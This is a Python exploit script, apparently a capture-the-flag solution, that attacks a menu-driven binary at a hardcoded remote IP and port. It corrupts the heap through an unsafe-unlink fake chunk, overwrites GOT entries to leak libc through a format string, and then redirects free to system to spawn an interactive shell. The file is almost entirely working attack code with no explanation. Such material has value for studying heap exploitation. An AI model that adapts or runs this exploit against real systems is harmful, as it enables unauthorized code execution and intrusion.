#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './27b201be-af0d-4fb9-85b8-f6ea9712e632.d'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file]}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'47.75.154.113', 'port':9999})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.23.so')
env.select()

#==========

binf = ELF(bin_file)
addr_got_free       = binf.got['free']
addr_got_strlen     = binf.got['strlen']
addr_got_main       = binf.got['__libc_start_main']
addr_plt_printf     = binf.plt['printf']
addr_ptr            = 0x602180

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main    = libc.sep_function['__libc_start_main']

#==========

def attack(conn):
    d = D(conn)

    d.read(0, 'a'*40)
    d.read(1, 'b')
    d.read(2, 'c')
    d.read(3, 'd'*0xa0)
    d.read(4, 'e')
    d.read(5, 'f'*0xa0)

    d.wipe(1)
    d.wipe(5)

    d.wipe(0)
    d.read(0, '/'*53+'a'*2)
    d.edit(3, 'X'*0x50+p64(0xa0))
    
    d.read(5, 'g'*0xa0)
    fake_chunk  = p64(0)
    fake_chunk += p64(0x30)
    fake_chunk += p64(addr_ptr+8*5 - 0x18)
    fake_chunk += p64(addr_ptr+8*5 - 0x10)
    fake_chunk += '\x00'*0x10
    fake_chunk += p64(0x30)
    fake_chunk += p64(0x90)
    d.edit(5, fake_chunk)
    d.wipe(3)

    d.edit(5, p64(addr_got_strlen))
    d.edit(2, p64(addr_plt_printf))

    d.read(6, '%15$s'.ljust(0x8, '!')+p64(addr_got_main))
    addr_libc_main      = u(conn.readuntil('!', drop=True)[:8])
    libc.address        = addr_libc_main - offset_libc_main
    addr_libc_system    = libc.sep_function['system']
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    d.edit(5, '%p')
    d.edit(5, p64(addr_got_free))
    d.edit(2, '%p')
    d.edit(2, p64(addr_libc_system)[:-1])

    d.edit(6, 'sh')
    d.wipe(6)

class D:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def read(self, index, msg):
        self.sendlineafter('Which? :', '1')
        self.sendlineafter('Which? :', str(index))
        self.sendlineafter('msg:', msg)

    def edit(self, index, msg):
        self.sendlineafter('Which? :', '2')
        self.sendlineafter('Which? :', str(index))
        self.sendlineafter('msg:', msg)

    def wipe(self, index):
        self.sendlineafter('Which? :', '3')
        self.sendlineafter('Which? :', str(index))

#==========

if __name__=='__main__':
    while True:
        conn = communicate(env.mode, **env.target)
        try:
            attack(conn)
            break
        except:
            conn.close()
            pass
    conn.interactive()
    
#==========
